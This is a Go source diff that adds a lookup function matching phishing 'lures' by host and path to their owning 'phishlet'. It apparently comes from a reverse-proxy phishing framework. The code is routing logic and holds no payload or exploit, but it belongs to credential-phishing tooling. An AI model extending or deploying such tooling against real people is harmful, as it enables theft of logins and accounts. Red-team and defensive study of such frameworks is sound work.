@@ -784,6 +784,32 @@ func (c *Config) GetLureByPath(site string, host string, path string) (*Lure, er
 	return nil, fmt.Errorf("lure for path '%s' not found", path)
 }
 
+// FindLureByPath searches all lures across all phishlets, matching by host and
+// path without restricting to a specific phishlet name. Returns the matching
+// lure and its owning phishlet so the caller can override hostname-based
+// phishlet resolution with the authoritative lure owner.
+func (c *Config) FindLureByPath(host string, path string) (*Lure, *Phishlet, error) {
+	for _, l := range c.lures {
+		pl, err := c.GetPhishlet(l.Phishlet)
+		if err != nil {
+			continue
+		}
+		if l.Hostname != "" {
+			if host != l.Hostname {
+				continue
+			}
+		} else {
+			if host != pl.GetLandingPhishHost() {
+				continue
+			}
+		}
+		if l.Path == path {
+			return l, pl, nil
+		}
+	}
+	return nil, nil, fmt.Errorf("no lure for path '%s' on host '%s'", path, host)
+}
+
 func (c *Config) GetPhishlet(site string) (*Phishlet, error) {
 	pl, ok := c.phishlets[site]
 	if !ok {
